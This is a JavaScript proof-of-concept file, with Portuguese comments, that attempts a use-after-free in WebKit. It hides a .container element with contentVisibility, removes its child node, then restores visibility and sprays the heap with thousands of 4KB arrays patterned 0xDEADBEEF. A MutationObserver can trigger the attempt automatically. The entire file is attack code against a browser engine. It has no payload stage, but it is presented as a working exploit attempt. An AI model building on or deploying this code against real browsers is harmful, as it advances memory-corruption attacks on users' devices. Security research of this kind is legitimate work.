// js/uaf_webkit_poc/poc.js
import { debug_log } from './module/utils.mjs';

let uafCoreLogicHasRun = false; // Flag para controlar a execução da lógica principal

function heapSpray() {
  let spray = [];
  const sprayIterations = 10000; // Mantendo em 5000 por enquanto
  // Novo padrão de bytes para o spray
  const sprayPattern = [0xDE, 0xAD, 0xBE, 0xEF]; 
  
  debug_log(`Iniciando heapSpray com ${sprayIterations} iterações e padrão [DE,AD,BE,EF]...`);

  for (let i = 0; i < sprayIterations; i++) {
    let arr = new Uint8Array(0x1000); // 4KB
    for (let j = 0; j < arr.length; j++) {
      arr[j] = sprayPattern[j % sprayPattern.length]; // Aplica o padrão repetidamente
    }
    spray.push(arr);
  }
  return spray;
}

export function triggerUAF() {
  const currentContainer = document.querySelector(".container");

  if (!currentContainer) {
    debug_log("Erro Crítico: Elemento .container não encontrado para UAF.");
    console.error("Erro Crítico: Elemento .container não encontrado para UAF.");
    return;
  }

  if (uafCoreLogicHasRun && !document.getElementById('runUAFBtn').disabled) { // Se já rodou e o botão está habilitado (nova tentativa)
    debug_log("UAF já foi tentado. Para um novo teste completo, recarregue a página. Tentando apenas alternar visibilidade.");
    currentContainer.style.contentVisibility = "hidden";
     setTimeout(() => {
        if (document.body.contains(currentContainer)) {
            currentContainer.style.contentVisibility = "auto";
        }
        debug_log("(Re-tentativa leve) Visibilidade alternada.");
    }, 0);
    return;
  }


  const currentChild = currentContainer.querySelector(".child");

  debug_log("Iniciando tentativa de UAF: contentVisibility=hidden...");
  currentContainer.style.contentVisibility = "hidden";

  if (currentChild) {
    debug_log("Elemento .child encontrado, removendo-o.");
    currentChild.remove();
  } else {
    debug_log("Elemento .child já foi removido ou não encontrado inicialmente.");
  }

  uafCoreLogicHasRun = true; 
  if(document.getElementById('runUAFBtn')) { // Desabilitar botão após primeira tentativa real
      document.getElementById('runUAFBtn').disabled = true;
      debug_log("Botão de UAF desabilitado para prevenir sprays múltiplos acidentais. Recarregue para reabilitar.");
  }


  setTimeout(() => {
    debug_log("Continuando UAF: contentVisibility=auto, heapSpray()...");
    if (document.body.contains(currentContainer)) {
        currentContainer.style.contentVisibility = "auto";
    } else {
        debug_log("Container foi removido do DOM antes de contentVisibility='auto'.");
        return;
    }
    
    let sprayArrays = heapSpray(); 
    if(sprayArrays.length > 0) {
        debug_log(`Heap spray realizado com ${sprayArrays.length} arrays (padrão [DE,AD,BE,EF]).`);
    }
    debug_log("Tentativa de UAF (principal) concluída. Verifique o console e comportamento do navegador.");
  }, 0);
}

// Configuração do MutationObserver
const initialContainerForObserver = document.querySelector(".container");
if (initialContainerForObserver) {
    const observer = new MutationObserver((mutationsList, obs) => {
      if (!uafCoreLogicHasRun) { 
        debug_log("MutationObserver: DOM tree modified, chamando triggerUAF (primeira vez via observer)...");
        triggerUAF();
        // O triggerUAF agora desabilita o botão e uafCoreLogicHasRun impede novas execuções completas.
        // Desconectar o observer ainda é uma boa prática para garantir.
        obs.disconnect(); 
        debug_log("MutationObserver desconectado.");
      } else {
        obs.disconnect(); // Se já rodou, apenas desconecta.
      }
    });
    observer.observe(initialContainerForObserver, { childList: true, subtree: true });
} else {
    console.warn("Elemento .container inicial não encontrado para MutationObserver no UAF PoC.");
}
